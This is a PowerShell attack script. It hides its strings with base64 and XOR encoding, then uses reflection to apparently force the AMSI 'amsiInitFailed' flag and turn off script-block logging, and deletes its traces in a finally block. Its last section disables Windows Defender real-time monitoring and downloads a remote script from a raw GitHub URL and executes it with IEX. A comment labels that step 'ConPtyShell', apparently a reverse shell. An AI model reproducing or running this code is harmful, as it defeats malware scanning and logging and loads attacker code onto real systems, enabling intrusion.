$env:IVRDbw6K = "+5j5mPuY8Jj9mPyY35jqmPeY7ZjomMiY95j0mPGY+5jhmMuY/ZjsmOyY8Zj2mP+Y65g="
$env:qRFcFwJ9 = "y5jhmOuY7Jj9mPWYtpjVmPmY9pj5mP+Y/Zj1mP2Y9pjsmLaY2ZjtmOyY95j1mPmY7JjxmPeY9pi2mNmY9ZjrmPGYzZjsmPGY9JjrmA=="
$env:j3H7e1kD = "y5j9mOyYzpj5mPSY7Zj9mA=="
$env:CrcZCApw = "35j9mOyYzpj5mPSY7Zj9mA=="
$env:qVs0u35c = "35j9mOyYzJjhmOiY/Zg="
$env:Qrc27Lex = "3Zj2mPmY+pj0mP2Yy5j7mOqY8ZjomOyY2pj0mPeY+5jzmNSY95j/mP+Y8Zj2mP+Y"
$env:pZeGCOTc = "+Zj1mOuY8ZjRmPaY8ZjsmN6Y+ZjxmPSY/Zj8mA=="
$env:ugcf5Ziw = "y5jhmOuY7Jj9mPWYtpjVmPmY9pj5mP+Y/Zj1mP2Y9pjsmLaY2ZjtmOyY95j1mPmY7JjxmPeY9pi2mM2Y7JjxmPSY65g="
$env:qzSdFeLW = "35j9mOyY3pjxmP2Y9Jj8mA=="
$env:biB38ezM = "0JjTmN2YwZjHmNSY15jbmNmY1JjHmNWY2ZjbmNCY0ZjWmN2YxJjLmNeY3pjMmM+Y2ZjKmN2YxJjImPeY9JjxmPuY8Zj9mOuYxJjVmPGY+5jqmPeY65j3mP6Y7JjEmM+Y8Zj2mPyY95jvmOuYxJjImPeY75j9mOqYy5jwmP2Y9Jj0mMSYy5j7mOqY8ZjomOyY2pj0mPeY+5jzmNSY95j/mP+Y8Zj2mP+Y"

function foMQrvFf($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=$b[$i] -bxor 152};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$vt9 = foMQrvFf 'qVs0u35c'
$eb7 = foMQrvFf 'qzSdFeLW'
$wu0 = foMQrvFf 'j3H7e1kD'
$iin = foMQrvFf 'CrcZCApw'
$ako = [System.Reflection.BindingFlags]((0xA0 -bxor 0x80) + (0xF6 -bxor 0xFE))

$j7k = [Ref].Assembly

try {
  Start-Sleep -Milliseconds 111
  $null = [Environment]::OSVersion.Version
  $null = [System.IO.Path]::GetTempPath()
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption

  try {
    $t29 = foMQrvFf 'ugcf5Ziw'
    $c5h = $j7k.$vt9($t29)
    $zog = foMQrvFf 'IVRDbw6K'
    $m6e = foMQrvFf 'biB38ezM'
    $icd = $c5h.$eb7($zog, $ako)
    $xqd = foMQrvFf 'Qrc27Lex'
    $zhq = $icd.$iin($null)
    if ($zhq -eq $null) {
      $zhq = @{}
      $icd.$wu0($null, $zhq)
    }
    $i3o = New-Object "System.Collections.Generic.Dictionary[string,object]"
    $i3o.Add($xqd, 0)
    $zhq[$m6e] = $i3o
    $v1o = $icd.$iin($null)
    if ($v1o -ne $null -and $v1o.ContainsKey($m6e) -and $v1o[$m6e][$xqd] -eq 0) {
      Write-Host '[+] Stage 1 OK'
    } else {
      Write-Host '[!] Stage 1 failed'
    }
  } catch {
    Write-Host '[!] Stage 1 failed'
  }

  try {
    $wd4 = foMQrvFf 'qRFcFwJ9'
    $vb3 = $j7k.$vt9($wd4)
    $dkq = foMQrvFf 'pZeGCOTc'
    $isd = [System.DateTime]::Now.Ticks
    $tqe = $vb3.$eb7($dkq, $ako)
    $tqe.$wu0($null, $true)
    $w34 = $tqe.$iin($null)
    if ($w34 -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $ojw = foMQrvFf 'qRFcFwJ9'
    $wit = $j7k.$vt9($ojw)
    if ($wit -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }
}
finally {
  Remove-Item Env:\qVs0u35c -ErrorAction SilentlyContinue
  Remove-Item Env:\qzSdFeLW -ErrorAction SilentlyContinue
  Remove-Item Env:\j3H7e1kD -ErrorAction SilentlyContinue
  Remove-Item Env:\CrcZCApw -ErrorAction SilentlyContinue
  Remove-Item Env:\qRFcFwJ9 -ErrorAction SilentlyContinue
  Remove-Item Env:\pZeGCOTc -ErrorAction SilentlyContinue
  Remove-Item Env:\ugcf5Ziw -ErrorAction SilentlyContinue
  Remove-Item Env:\IVRDbw6K -ErrorAction SilentlyContinue
  Remove-Item Env:\biB38ezM -ErrorAction SilentlyContinue
  Remove-Item Env:\Qrc27Lex -ErrorAction SilentlyContinue
}
    # ConPtyShell execution
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        IEX(IWR https://raw.githubusercontent.com/rishieissocool/images/refs/heads/main/something.ps1 -UseBasicParsing);
    } catch {
        Write-Host "[!] 112 execution failed"
    }
    